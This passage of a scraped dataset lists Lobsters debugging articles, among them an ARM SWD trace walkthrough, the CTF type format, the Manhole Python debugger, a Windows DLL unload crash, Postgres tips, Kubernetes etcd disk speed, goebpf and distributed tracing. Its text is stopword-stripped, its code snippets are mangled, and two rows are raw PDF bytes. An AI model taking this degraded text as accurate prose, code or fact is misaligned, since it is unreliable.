saleae analyzer also let u export analysis csv file let walk transaction see added observation note inline time analyzer name decoded protocol result write ap abort register abort reset state swd request debugport write abort swd turnaround swd ack ok swd turnaround swd wdata reg abort bit swd data parityok swd trailing bit write select register used target ap interest discover available aps walking rom table detail specification per coresight specification know ap selected ahbap swd request debugport write select swd turnaround swd ack ok swd turnaround swd wdata reg select bit swd data parityok swd request accessport write csw swd turnaround swd ack ok swd turnaround accessing ahbap type memap csw register written order configure type access performed one interesting setting addrinc used control whether access address automatically incremented read swd wdata reg csw bit addrincincrement single sizeword bit swd data parityok transfer address register tar programmed address interest close address trying read interestingly match swd request accessport write tar swd turnaround swd ack ok swd turnaround swd wdata reg tar swd data parityok request read data via data readwrite register drw finally issued return data address increment address tar word next read would return swd request accessport read drw swd turnaround data ready yet ack wait returned swd ack wait swd request accessport read drw swd turnaround read request ackd per documentation read request posted mean result access returned next transfer result another ap register read dp register read rdbuff mean data transaction discarded swd ack ok swd wdata reg drw swd data parityok swd request accessport read drw swd turnaround swd ack ok actual value data swd wdata reg drw swd data parityok swd request accessport read drw swd turnaround swd ack ok actual value data swd wdata reg drw swd data parityok swd request accessport read drw swd turnaround swd ack ok actual value data address wanted read first place swd wdata reg drw swd data parityok swd request accessport read drw swd turnaround swd ack ok actual value data swd wdata reg drw actual trace see another read performed bringing total byte read debugger byte interesting seems like debugger caching byte data start trace reading memory range see swd transaction get issued test start saleae trace run gdb px mean jlinkgdbserver must caching result always issuing request actual mcu try read byte see new transaction get issued tar starting reference included trace original trace directory closing hope post gave better understanding technology make cortexm arm debug stack future run debugger issue better idea start looking issue future topic love delve related debugger include embedded trace macrocell etm data watchpoint trace dwt peripheral well implementing thread awareness flash loader plugins topic like u cover topic article love see detail let u know discussion area see anything like change submit pull request github useful reference link
166,Lobsters,debugging,Debugging,The Compact C Type Format in the GNU toolchain,https://lwn.net/SubscriberLink/795384/6f053c2605b27665/,compact c type format gnu toolchain,signing subscription dwarf linux dtrace adding support gcc enhancing linker work also done toolchains microconference linux plumber conference log,lwnnet need without subscriber lwn would simply exist please consider signing subscription helping keep lwn publishing compact c type format ctf way representing information binary program seen simpler alternative widely used dwarf format ctf around year seen much use linux world according elena zannoni talked ctf open source summit japan situation may change work underway bring ctf support gnu tool shipped universally linux system compiling program binary form discard lot information found source code information needed time come track bug compiled program facilitate work compiler create debugging information record name type variable used program along function name line number source program information stored one many format dwarf far commonly used format unixlike system one given dominance dwarf one might wonder anyone would want work alternative one problem dwarf complex rather containing straightforward information program dwarf entry essentially program right run generate needed information make dwarf flexible also complicated verbose dwarf data associated program huge size mean system dwarf data installed program relegated debuginfo package even present unless owner gone way install ctf created desire able perform debugging task even absence debuginfo package able simpler faster way dwarf also expose lot information program source company might wish keep ctf contains lot le unneeded information ctf format first created solaris system used linux dtrace port since said nothing dtracespecific ctf though also available freebsd macos key difference ctf dwarf perhaps ctf limit modeling type system managing mapping symboltable entry specific type dwarf much ambitious said modeling everything relating c language map hardware ctf simplicity mean omit location list stack machine lot machinery bringing ctf linux requires contributing lot code upstream one piece puzzle adding support gcc new gt option cause compiler generate ctf data getting data final executable requires support binutils package well includes enhancing linker well adding support tool like objdump readelf work also done get ctf support gdb debugger zannoni showed sample output size utility ctf data stored elf section named ctf required space compared dwarf data program dwarf data kernel requires ctf data fit ctf dwarf data coexist elf file said since ctf data dedicated section ctf data naturally smaller format also includes compression reduce size requirement result data unlike dwarf information need stripped get executable file reasonable size thus dwarf data normally shipped separate debuginfo package ctf data easily included binary package always available internally ctf data stored structure called container dictionary dictionary contains header number subsection dedicated data like function information variable information type string table name already present elf string table header start magic number useful determining endianness rest data version number set flag version one original solaris ctf version two created porting dtrace linux mostly increase number limit found first version third version still defined include number header change among thing even fourth version initial planning stage intent keep data abi compatible though said returning linker support zannoni noted gcc place single ctf section object file creates linker take section merge larger section removing duplicate information potential problem though different object file may define conflicting object using name happens linker create child dictionary associated specific translation unit conflicting data time though linked executable contain one large shared ctf dictionary perhaps small number tiny subdictionaries libctf library added binutils package implement ability read write ctf data used compiler linker debugger library along readelf objdump change merged binutils trunk may linker change posted need work merged hope ctf support land binutils upcoming release gcc patch posted time modified response review comment one piece yet posted linktime optimization support coming soon luck said support merged time gcc release due gdb support also discussion project mailing list gdb release targeted work zannoni closed look thing go set discussion planned toolchains microconference linux plumber conference evidently still optimization made reduce size ctf data also fairly significant gap backtrace support yet present ctf expansion language c horizon perennial lowest priority development team documentation specification format life c header file clearly need change future editor thanks linux foundation supporting travel event log post comment
167,Lobsters,debugging,Debugging,A Python prompt into a running process: debugging with Manhole,https://pythonspeed.com/articles/live-debugging-python/,python prompt running process debugging manhole,manhole work security risk someone run arbitrary program inside container already plenty access adding manhole seem like much security risk regardless time use manhole interpreter consider failure ought able debug problem logging monitoring getting access object prepare worse logging crash handler like faulthandler,sometimes python process behave strangely run slowly give wrong answer hopefully logging logging always enough debug process planned ahead access interactive python prompt inside running process poke around see going article learn using manhole project along discussion risk suggestion get python object care work consider following program run flask enables manhole flask import flask import manhole class counter def increment self selfi def str self return str selfi counter counter app flask name approute def index counterincrement return str counter n name main manholeinstall patchforkfalse daemonconnectiontrue apprun run server start flask application manhole python serving flask app lazy loading environment production warning development server use production deployment use production wsgi server instead debug mode manhole manhole uds path manhole waiting new connection running http press ctrlc quit notice tell u process pid listening pth send query web server curl http curl http curl http also get python prompt inside running process use socat networking tool open unix socket manhole listens based process pid socat readline unixconnect print stack trace thread python default jul gcc red hat linux type help copyright credit license information manholeconsole import main maincounteri also print stack trace running thread useful something slow deadlocked note manhole come manholecli utility technically mean need socat problem rendering stick socat security risk obviously useful risky far security go running inside docker container interpreter accessible via file inside container way access interpreter via docker exec kubectl exec equivalent someone run arbitrary program inside container already plenty access adding manhole seem like much security risk significant risk breaking production environment since messing around production sort risk running query production database server running laptop staging using manhole problem longrunning batch process acting weird whose output control may le risky server access user data worried breaking use regardless time use manhole interpreter consider failure ought able debug problem logging monitoring debug problem also make sure add enough logging getting access object poking around object looking content useful get access object need modulelevel object including main program script becomes module main import example another option explicitly giving manhole object expose local variable change flask server like name main manholeinstall patchforkfalse daemonconnectiontrue local counter counter apprun connect python interpreter counter object need import socat readline unixconnect manholeconsole counter maincounter object finally garbage collector python access every object memory use example find instance arbitrary class socat readline unixconnect manholeconsole import gc flask import flask apps gcgetobjects isinstance flask apps flask import main mainapp apps true prepare worse failure inevitable prepare advance slowness crash strange behavior happen sooner later include fact really ought much logging possible crash handler like faulthandler saw case providing backdoor python interpreter really know gone wrong
169,Lobsters,debugging,Debugging,Crashing DInput8 DLL with two lines of code,https://cookieplmonster.github.io/2019/08/02/win10-dinput8-crash/,crashing dll two line code,bug system dlls bug lilypad bug system dlls thread pool msdn page sure function completed execution dll unloaded without minimal reproducible example basic threadpool heap developer solve delayloaded dlls first time function exported called really microsoft fix reported via feedback hub submitted pull request,backstory scroll bug system dlls section today test subject started crash found got source compiled started poking around application verifier sure enough crashed quickly crashed enumerating plugins usually issue articleworthy useafterfree readpastbuffer issue often overlooked page heap allowing detect quickly however call stack unusual frame may incorrect andor missing ntdlldll rtlrunonceexecuteonce kernelbasedll initonceexecuteonce ntdlldll rtlptpworkcallback ntdlldll tppworkerthread basethreadinitthunk ntdlldll rtluserthreadstart ntdlldll rtluserthreadstart gap call stack point valid code without symbol call stack corrupted code gone maybe dynamically generated got make thing even worse since crashed thread quickly determine started dang bug let take step back go back code since crash happens enumeration plugins start stepping enumeration one one stop crash offending plugin turned lilypad gamepad plugin since plugins loaded quickly unloaded obvious issue would one create thread finish dll unloads result thread would attempt execute code already freed call stack would look like one observed curiously enough lilypad spawn thread point fact almost nothing load dlls depends rather window loading lilypad dll performs basic initialization something could caused lilypad maybe one dependant dlls setupapidll hiddll however three system dlls surely could cause crash really bug system dlls figured bug lilypad likely turned sight dependent dlls keeping theory thread spawned somebody finishing dll unloaded placed breakpoint lilypad dllmain function checked thread one thread callstacks looked suspiciously ntdlldll ntwaitforsingleobject unresolved previously ntdlldll rtlrunonceexecuteonce kernelbasedll initonceexecuteonce lambdainvokerstdcall unresolved previously vfbasicsdll avrfprtlworkercallback ntdlldll rtlptpworkcallback ntdlldll tppworkerthread basethreadinitthunk ntdlldll rtluserthreadstart ntdlldll rtluserthreadstart look much like crashing thread sure enough would seem like thread running moment unloaded due lilypad unloading since called point would seem like spawn thread dllmain prove cue disassembler load dll symbol see function symbol locating code trivial pseudocode look like dword lambdainvokerstdcall lpvoid initonceexecuteonce ginitonce lambdainvokerstdcall return getlasterror lambda passed argument bool initializeinputhost return queueuserworkitem lambdainvokerstdcall turn called function called dllprocessattach prof theory although thread per se instead work item thread pool queueuserworkitem submits lambda processed asynchronously resume execution immediately dllmain stall catch take look msdn page queueuserworkitem function dll queued worker thread sure function completed execution dll unloaded seems exactly case work queued nothing wait function finish unloading dll could prove trivially placing breakpoint end lambda getlasterror program crashed without hitting breakpoint mean function never finished nasty minimal reproducible example since issue seems trivial reproducing standalone program boil literally line wait crash happen obviously crash majority case application verifier possible make consistent mentioned snippet need ran basic threadpool test enabled also like using heap case dll code get released soon possible reason work case freelibrary lazy releasing module code persists memory long enough task finish contractual however theoretically change time point think said pretty good confidence bug based test seems concern apps window developer solve aware fully reliable way solving unloading dll quickly however may done even without user input like case lilypad statically linked unloading lilypad also unloaded linked dll specific case however solved delayloaded dlls dependant dlls marked loaded soon module depending load instead loaded first time function exported called lilypad case plugin enumeration call export called later lilypad really used making delayloaded dll work bug around loading plugin enumeration phase may also potentially speed process mean le work performed enumerating plugins note course universal remedy issue sort likely help case ever encounter problem microsoft fix answer seems obvious fact may trivial look theory enough selfreference queueing work item release reference callback return eg via freelibraryandexitthread problematic part increasing dll reference count obviously need done submitting work inside else prone race earlier however work submitted loader lock know getmodulehandleex getmodulehandleexflagfromaddress flag called loader lock increasing initializeinputhost releasing lambda exit correct fix issue reported via feedback hub additionally submitted pull request work around bug instructed article
170,Lobsters,debugging,Debugging,A Practical Guide to (Correctly) Troubleshooting with Traceroute,https://archive.nanog.org/meetings/nanog47/presentations/Sunday/RAS_Traceroute_N47_Sun.pdf,practical guide correctly troubleshooting traceroute,,obj endobj obj filterflatedecodeid index info rlength rsize stream b endstream endobj startxref eof obj stream uvf c f endstream endobj obj endobj obj extgstate font procset pdftextimagecimagei xobject rotate endobj obj stream ޓ q endstream endobj obj stream vo vw c endstream endobj obj stream c x endstream endobj obj stream 䥟 e b
171,Lobsters,debugging,Debugging,Postgres tips for the average and power user,https://www.citusdata.com/blog/2019/07/17/postgres-tips-for-average-and-power-user/,postgres tip average power user,blogging email protected psql tag query use ctrlr better psql output get stack trace error generating inserting fake data better pgstatactivity managing multiple version postgres devprod parity pgenv tip citusdata enjoy reading,personally big fan email like blogging good email thread like good novel following along always curious come next mean one email email protected someone reply receive replyall replyall mean one like started last week internally among azure postgres team first email titled random citus development psql tip piled tip power user suggestion postgres tip relevant working directly citus codebase others relevant anyone work postgres useful debugging postgres internals thread still ongoing great tip psql tag query use ctrlr psql support ctrlr search previous query ran demo testing complex scenario like adding little comment query becomes tag later find query select count test full count count row time m reverseisearch f select count test full count case letter going enough find query better psql output find x lacking pspg great available pgdg via sudo yum install pspg equivalent system following psqlrc set pspg minimalistic configuration cat psqlrc timing pset linestyle unicode pset border setenv pager pspg nomouse bx nocommandbar notopbar set histsize get stack trace error psql select pgbackendpid pgbackendpid row another shell gdb p gdb b errfinish breakpoint file elogc line gdb c continuing back psql select back gdb breakpoint errfinish gdb bt errfinish fcinfo optimized execinterpexpr generating inserting fake data know lot way generate fake data want something simple quick directly sql create table sometable id bigserial primary key float select createdistributedtable sometable id insert sometable select random generateseries sec insert sometable select random generateseries sec insert sometable select random generateseries sec insert sometable select random generateseries min better pgstatactivity talked pgstatstatements le pgstatactivity pgstatactivity show information currently running query though default view get improved following query easy tweak well select pid procpid usename substring query query querystart backendstart backendtype stateactive order querystart managing multiple version postgres many people one version postgres enough working different version production useful locally well devprod parity pgenv tool help manage easily swap postgres version tip email thread go may create another post useful tip also love hear useful tip working postgres let u hear help share others citusdata big thanks onder marco furkan team contributing tip thread enjoy reading interested reading post team sign monthly newsletter get latest content delivered straight inbox
172,Lobsters,debugging,Debugging,"Toski: Scheme IDE with ""preview execution""",https://kennethfriedman.org/projects/toski/,toski scheme ide preview execution,toski preview execution preview execution useful preview execution work open source toski github page name ai koan collaboration debugging better,toski toski prototype new debugging tool scheme native mac editor scheme simply launch app write scheme code run toski special debugging feature called preview execution preview result section code without actually running preview execution twice hard writing code first w kernighan debugging still feel twice hard toski introduces new debugging technique called preview execution reading debugging code able see code run without run able see preview part code might toski previewing code easy selecting region code preview execution useful scheme strong support functional programming state mutation exist common scheme program preview execution important code involves stateâ mutation kind might want see result snippet code without changing state entire instance toski highlight section code display output selected region however deselect section scheme instance state code highlighted even highlighted code involves state change preview execution work hood preview execution work using scheme environment code highlighted toski duplicate current environment executes code cursor moved code deselected toski remove new environment returning instance previous state open source project open source check fork submit pull request toski github page name whay emacs called emacs emacs editor developed street ice cream store emack bolio yet emack founder ice cream store toski developed street ice cream store toscanini yet none founder named toscanini cocky novice said stallman guess editor called emacs justifier called bolio stallman replied forcefully name name popular ice cream shop bostontown neither men anything question answered yet unanswered novice turned go stallman called emack bolio anything ice cream shop ai koan collaboration project originally final project professor sussman class large scale symbolic system also known adventure advanced symbolic programming spring term collaboration blake elia jared pochtar wrote report called debugging better describes original motivation implementation semester time called editor schemer turn everyone uncle work scheme make project call schemer
173,Lobsters,debugging,Debugging,Tarot for Hackers,https://christine.website/blog/tarot-for-hackers-2019-07-24,tarot hacker,tarot hacker contact magick,tarot hacker oh finally lost word close friend mine said first told experimenting reading tarot card tarot card stereotypical staple occultthe every card represents idea meme expressed way act soul like iron filing magnet shuffle card universe via entropy examines myriad input helpfully order get exactly message need actually extremely philosophical act draw tarot deck interpret result year many interpretation framework interpretation tarot would like introduce metaframework using tarot card debugging tool work computer system put part create bond otherwise anonymous inner part machine never seen touched bond stick idea development testing deployment phase even stay around stop working something ever gotten weird sense recognize author code reading idea start envision product service trying understand think plan went user service understanding help missing part knowledge fit larger whole write help detail better transition shared infrastructure computing others machine made harder see individual part whole every little bit help focus thing first card motive draw place center spread look meaning site like biddytarotcom googling name card tarot meaning help lot consider relates back factor play second card facet part system failing could refer machine bit code even human factor context future card help determine remember metaphor need interpretation help understand going third card immediate past changed cause problem use motive help identify component broken metaphor rarely literal answer combination facet immediate past help identify systemic organizational fault play fault usually enough help uniquely identify service infrastructure next draw action card help decide action need take could restarting server fixing communication pattern lack thereof even nothing waiting minute sometimes mean need stop try read later okay happen though rare occurrence next card result outcome would given action executed entirety result nt supposed taken super seriously consequence reading card butterfly effect make outcome reality slightly different usually help get general idea go like get finally draw lesson card signifies theme postmortem around action help guide future discussion went wrong avoid future may result charged feeling really best go entire postmortem process help get closure need postmortem usually help bring thing surface missed blame anger place healing growth hate strife optionally draw metaresult happen result lesson nt strictly required find help peeking potential future result taken heart hope able help debugging need use strategy trying understand complicated computer system fit together well share mastodon article posted fact circumstance may changed since publication please contact jumping conclusion something seems wrong unclear series magick
174,Lobsters,debugging,Debugging,Pyrasite: tools for injecting code into running Python processes,http://pyrasite.com/,pyrasite tool injecting code running python process,,
175,Lobsters,debugging,Debugging,Cloud Performance Root Cause Analysis at Netflix (2018),https://www.youtube.com/watch?v=03EC8uA30Pw,cloud performance root cause analysis netflix,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature
177,Lobsters,debugging,Debugging,"Kubernetes, etcd and disk throughput",https://blog.bejarano.io/kubernetes-etcd-and-disk-throughput.html,kubernetes etcd disk throughput,kubernetes etcd disk throughput tl dr ensure sufficient disk read write speed etcd cluster node moving kubernetes kubernetes swarm preparation ansible compose kubernetes api reference doc digitalocean kubernetes everything work everything checked untainted calico root cause analysis root cause comment networkpolicy minute everything broke loose reason root cause b weave everything broke reason root cause c etcd wrong everything healthy lesson learned put usb thumb drive note resiliency note,kubernetes etcd disk throughput mon jul tl dr ensure sufficient disk read write speed etcd cluster node minimally decent hard drive put varlibetcd thumb drive moving kubernetes really need kubernetes growing starting find practice true path mastery learning kubernetes something procrastinated long already planned migrate service docker swarm onto kubernetes week preparation wrote ansible playbook configure single node would comprise kubernetes cluster need refactored compose file kubernetes object help priceless kubernetes api reference doc tested deployment digitalocean kubernetes cluster everything work tested playbook deployment similarlyspecced droplet everything checked repeated step time remember iterated little change configuration settled notified handful user planned downtime maintenance started backing taking everything offline installed o prepared ansible ran playbook kubeadm init untainted master node rather node installed calico created object done thousand time already scheduler controllermanager went alternating error crashloopbackoff state carefully repeated step followed vps many time failing journey begin root cause analysis root cause networkpolicies googling following message kubescheduler kubecontrollermanager log comment github issue instantly made believe culprit chaos networkpolicies made sense one global networkpolicy prohibited traffic pod whitelisted certain path writing perdeployment networkpolicies except kubesystem pod instantly convinced denied traffic kubeapiserver temporarily deleted networkpolicies fooled thinking everything scheduler controllermanager back online minute k get everything broke loose reason networkpolicy object affect pod within namespace exists kubesystem namespace affected networkpolicy object applied default namespace root cause b pod network googling found random issue github suggested similar connectivity issue using calico time thorough comparison cni plugins chose red flag come traffic encryption take thanks removed calico installed weave everything okay couple minute left time everything broke reason world would fieldtested pod network guilty denying traffic pod made sense time make silly attempt fix thing way even make theoretical sense desperation root cause c disk io speed looked kubeapiserver log desperation find message like know notify etcd port intuition tell notify kind agent notifies kubeapiserver available etcd node right meant every randomly made issue hard track available etcd node took glance etcd log contained ton line like google returned two issue suggesting low disk read speed cause message log discarded spinner server relatively fast morning late early choose went sleep clear answer woke gave thought wrong data kubernetes pod stored spinner o file thumb drive including varlibetcd etcd data directory quick coffee take everything offline reinstall o varlib spinning partition rerun playbook redeploy kubernetes voilà twenty minute everything healthy lesson learned put varlib usb thumb drive give latenight decision second thought least keep breaking stuff troubleshooting mini production outage one learns best note resiliency troubleshooted issue one thing surprised even time two core component scheduler controllermanager kubernetes single core one apiserver talk database pod deployment service pod kept running threw bunch time made think everything back online say lot kubernetes design resilient even control plane unhealthy run service note external access pod serious latency issue due fact service object lookup etcd pod serving traffic etcd unreachable latency spiked many second
178,Lobsters,debugging,Debugging,Library to work with ebpf from Go,https://github.com/dropbox/goebpf,library work ebpf go,go ebpf requirement supported ebpf feature installation quick start example perf event full xdp dump example kprobes exec dump example good reading,go ebpf nice convenient way work ebpf program perf event go requirement go linux kernel supported ebpf feature ebpf program socketfilter xdp kprobe kretprobe perf event support program type feature added future meanwhile contribution warmly welcomed installation main library go get githubcomdropboxgoebpf mock version needed go get githubcomdropboxgoebpfgoebpfmock quick start consider simple example read load attach order simple example handle error bpf goebpfnewdefaultebpfsystem read clang compiled binary bpfloadelf testelf load xdp program kernel name match function name c xdp bpfgetprogrambyname xdptest xdpload attach interface xdpattach defer xdpdetach work map test bpfgetmapbyname test value testlookupint fmtprintf value index map test dn like check example perf event library currently support one popular use case perfevents ebpf map key map cpuid ebpf go part actually bind cpuid map index maybe simple define special perfevents map key map cpuid bpfmapdef perfmap maptype bpfmaptypeperfeventarray maxentries max supported cpu bpfmapadd perfmap emit perf event data map perfmap index current cpuid bpfperfeventoutput ctx perfmap bpffcurrentcpu data sizeof data go part perf err goebpfnewperfevents perfmap ring buffer size perfevents err perfstartforallprocessesandcpus defer perfstop select case data perfevents fmtprintln data simple check full xdp dump example kprobes library currently support kprobes kretprobes simple kprobe handler function sec kprobeguessexecve int execveentry struct ptregs ctx bufperfoutput ctx return go part cleanup old probe err goebpfcleanupprobes attach probe program prog range bpfgetprograms err progattach nil create perf event eventsmap pbpfgetmapbyname event ppe err goebpfnewperfevents eventsmap event err ppestartforallprocessesandcpus defer eventsstop select case data event fmtprintln data kprobe event simple check exec dump example good reading
180,Lobsters,debugging,Debugging,Distributed Tracing — we’ve been doing it wrong,https://medium.com/@copyconstruct/distributed-tracing-weve-been-doing-it-wrong-39fc92a857df,distributed tracing wrong,distributed tracing wrong distributed tracing questionable best truly open source standard protocol many face tracing blog post w apm tool universal context propagation demarcate test traffic production known use trace data also known use jupyter notebook ldfi folk use distributed trace refer span attendant metadata together constitute lamented past additional metadata trace embedding highcardinality information problem traceview mindbogglingly complex distributed system aggregate analysis trace ave report successful trace analysis using machine learning span low level alternative traceview servicecentric view slos slis service topology graph deathstar architecture comparison view conclusion proactively surfacing,distributed tracing wrongmany thanks ramon nogueira sargun dhillon reading draft postdistributed tracing often considered hard deploy value proposition questionable best variety reason attributed tracing difficult apocryphal concern difficulty instrumenting every component distributed system forward appropriate header along every request might valid concern ultimately insurmountable problem incidentally explain tracing typically used much developer even deployedthe hard part distributed tracing collecting trace standardizing trace propagation exposition format deciding sample mean trivializing ingest problem indeed exist significant technical looking truly open source standard protocol political challenge overcome get ideal considered solved problem however even hypothetically problem solved good likelihood nothing much significantly changed far end user experience concerned tracing might still remain something deployed unlock enough value practical use common debugging scenariosthe many face tracingdistributed tracing comprises several disparate component instrumentation application middleware distributed context propagation trace ingest trace storage trace retrieval visualizationan awful lot conversation distributed tracing pivot around treating sort unary undertaking whose sole purpose aid full system diagnostics small part owing distributed tracing historically marketed blog post written zipkin opensourced mentioned zipkin make twitter faster initial commercial tracing offering likewise marketed apm toolstraces contain incredibly valuable data potential aid effort testing production running disaster recovery test enabling fault injection testing forth company fact already use trace data purpose start universal context propagation several us simply ferry span storage system uber known use tracing data demarcate test traffic production traffic facebook known use trace data critical path analysis shift traffic regular disaster recovery test facebook also known use jupyter notebook enable developer run arbitrary query trace data ldfi folk known use distributed trace fault injection testing none strictly pertains debugging scenario engineer trying troubleshoot issue looking tracewhen come debugging scenario primary interface remains call traceview though people also refer gantt chart waterfall diagram traceview refer span attendant metadata together constitute trace every open source tracing system well commercial tracing solution offer traceview based ui visualize query filter tracesthe problem every last tracing system seen far ultimate visualization traceview closely mirror core implementation detail trace generated even alternative visualization offered heatmap service topology view latency histogram ultimately lead traceviewi lamented past innovation see happening tracing space uiux front appears limited including additional metadata trace embedding highcardinality information trace providing ability drill specific span enabling intertrace intratrace query cleaving traceview primary visualization medium long remains case distributed tracing best come poor fourth metric log stacktraces debugging purpose worst end proving time money sinkthe problem traceviewa traceview meant provide bird eye view lifecycle single request across every single component distributed system request traverse advanced tracing system offering ability drill individual span look breakdown timing within single process span emitted function boundary foundational premise microservices architecture business requirement grow complex organization structure proponent microservices argue decomposing different business functionality standalone service enable small autonomous team endtoend lifecycle service unlocking ability build test deploy service independently however since decomposition come cost loss visibility service interacts others distributed tracing purported indispensable tool debugging complex interaction service unisonif truly mindbogglingly complex distributed system one single person complete understanding system head given time fact building tooling assumption even possible desirable seems bit antipattern ideally required time debugging tool help reduce search space engineer zero subset dimension servicesusershosts etc interest debugging scenario hand requiring engineer understand happened across entire service graph time debugging incident seems counter ethos microservices architecture first placeand yet traceview precisely admittedly tracing system provide condensed traceviews number span trace exceedingly large displayed single visualization yet amount information encapsulated even pared view still squarely put onus engineer sift data traceview expose narrow set culprit service endeavor machine truly faster repeatable le errorprone human accomplishinganother reason grown believe traceview wrong abstraction lends poorly hypothesisdriven debugging approach debugging fundamentally iterative process involves starting hypothesis followed inspection various observation fact reported system along different ax making deduction testing whether hypothesis hold waterbeing able quickly cheaply test hypothesis refine one mental model accordingly cornerstone debugging tool aim assist process debugging need interactive tool help either whittle search space case red herring help user backtrack refocus different area system ideal tool would proactively drawing user attention potentially problematic areasa traceview fundamentally anything interactive interface best hope traceview able see source increased latency view possible tag log associated help one spot pattern traffic mode latency distribution provide ability correlate across different dimension aggregate analysis trace help get around problem indeed report successful trace analysis using machine learning spot anomalous span identify subset tag might contributing anomalous behavior however yet see convincing visualization insight unearthed applying machine learning data mining span significantly different traceview dagspans low levelthe fundamental problem traceview span lowlevel primitive latency root cause analysis akin looking individual cpu instruction debug exception much higher level entity like backtrace would benefit daytoday engineer mostfurthermore argue ideally required entire picture happened lifecycle request modern day trace depict instead required form higher level abstraction went wrong analogous backtrace along context instead seeing entire trace really want seeing portion trace something interesting unusual happening currently process entirely manual given trace engineer required find relevant span spot anything interesting human eyeballing span individual trace hope finding suspicious behavior simply scalable especially deal cognitive overhead making sense metadata encoded various span like span id rpc method name duration span log tag forthalternatives traceviewtrace data useful exist incisive visualization surface vital insight happening interconnected part system case process debugging remains much reactive hinging user ability make right correlation inspect right part system slice dice across right dimension opposed tool guiding user formulating hypotheseswith caveat visual designer ux researcher following section want bandy couple idea visualization might look likeservicecentric viewswith industry consolidating around idea slos slis seems reasonable individual team must primarily responsible ensure service meet goal follows team best suited visualization servicecentric viewtraces especially unsampled treasure trove information every single component distributed system data mined sophisticated trace processing engine tease servicecentric insight user example servicecentric insight surfaced upfront without requiring user look trace latency distribution graph outlier requestslatency distribution graph service slos metmost common interesting weird tag request frequently retriedlatency breakdown service dependency meeting slolatency breakdown different downstream servicessome question preaggregated metric prayer answering requiring user pore span deduce answer result awfully hostile user experiencewhich begs question complex interaction various service owned different team sort traceview considered bestsuited shine light mobile developer stateless service owner owner managed stateful service like database platform owner might interested different view distributed system traceview onesizefitsall solution disparate need even complex microservices architecture service owner need deep knowledge two three upstream downstream service matter fact scenario sufficient user answer question pertaining limited number servicesthis dissimilar placing magnifying glass small subgraph service examine finetooth comb enable user ask pressing question regarding complex interaction service immediate dependency analogous backtrace service world one know wrong well context surrounding service help deduce whythe approach championing antithesis topdown traceview based approach one start entire trace progressively drill individual span contrary something bottomup approach involves starting investigation one attention laserfocused small search space closer potential cause incident expanding search space needed might involve enlisting help team analyze larger set service latter approach lends better quick dirty validation initial hypothesis one smoking gun one need embark focused detailed investigationservice topology graphsservicecentric view incredibly helpful user know service group service contributing increased latency error however complex system identifying offending service nontrivial problem time incident especially individual service triggered alertsservice topology view helpful pinpointing service showing spike error rate increased latency leading user visible degradation service quality service topology view referring service map depicts every single service system famously used depict deathstar architecture better dag based traceview instead love see upfront dynamically generated service topology view based specific attribute like error rate response time even user defined attribute help user frame question around specific suspect servicesto provide concrete example following service graph hypothetical newspaper webpage implemented number commercial tracing product frontpage service talk redis recommendation service ad service video service video service fetch video metadata dynamodb recommendation service fetch metadata dynamodb data redis mysql writes event kafka ad service fetch data mysql writes event kafkathe service graph described depicts topology useful one trying understand service dependency however debugging scenario specific service say video service experiencing increased response time topology view particularly usefula hypothetical service view graph newspaper front pagean improvement diagram depicted place problem service video service right front center draw user attention service bat visualization becomes obvious video service acting anomalously due slowdown response time impacting page load time portion frontpagea dynamic service topology graph showing interesting servicesdynamically generated service topology graph powerful static service map especially elastic autoscaled infrastructure able compare contrast service topology immediately pave way user start asking germane question asking better question system increase odds user formulating better mental model system behavingcomparison viewsanother useful visualization would comparison view trace currently lend none well juxaposed top since intent purpose one essentially comparing span mainspring article hammer home point span lowlevel meaningfully able unearth valuable insight trace datacomparing two trace require groundbreaking new visualization matter fact something like stacked bar chart showing data traceview depicts surprisingly insightful look two individual trace separately even powerful would ability visualize comparison trace aggregate enormously useful see newly deployed gc configuration change database impact response time downstream service course hour describing sound like ab testing impact infrastructural change across multiple service help trace data far markconclusioni questioning utility tracing data truly believe observability signal pregnant data rich causal contextual carried trace however also believe data woefully underutilized every last tracing solution long tracing product cleave traceview way shape form limited ability truly leverage invaluabe information extracted trace data moreover run risk propping userunfriendly unintuitive visual interface effectively stymieing user ability debug effectivelydebugging complex system even stateoftheart tooling incredibly hard tool need strive assist developer process forming validating hypothesis proactively surfacing relevant information outlier latency distribution characteristic tracing become tool developer operator reach immediately debugging production incident customer issue span multiple service required novel user interface visualization correspond closely mental model developer building operating servicesit take enormous amount careful thought design system layer different signal available trace data manner optimized easy exploration deduction need thought put system topology time debugging abstracted way help user getting blind spot without user ever look individual trace spanwhat need good abstraction layering especially ui sort lend well toward hypothesis driven debugging one iteratively ask question validate conjecture going automatically solve every last observability problem greatly help user hone sense intuition enable ask better question calling thought innovation happen visualization front real opportunity push envelope
181,Lobsters,debugging,Debugging,Code Coverage and Post-Release Defects: A Large Scale Study on Open Source Projects,https://hal.inria.fr/hal-01653728/document,code coverage postrelease defect large scale study open source project,,obj type catalog version page r openaction r fit name r outline r endobj obj creator title subject author producer keywords creationdate moddate trapped false ptexfullbanner miktexpdftex endobj obj type page kid r r r r r r r r r r r r r r r r r count endobj obj resource r type page parent r content r annots r r cropbox mediabox rotate endobj obj dests r endobj obj type outline first r last r count endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r group r annots r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r r r r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r annots r r r r cropbox rotate endobj obj type page content r resource r mediabox parent r cropbox rotate endobj obj font r xobject r r procset pdf text imagec imageb imagei endobj obj length filter flatedecode stream įw g xڅy e e endstream endobj obj type annot subtype link border c r rect endobj obj type annot subtype link border c r rect endobj obj kid r r r r limit docstart endobj obj title introduction r parent r next r endobj obj title reference r parent r prev r endobj obj length filter flatedecode stream 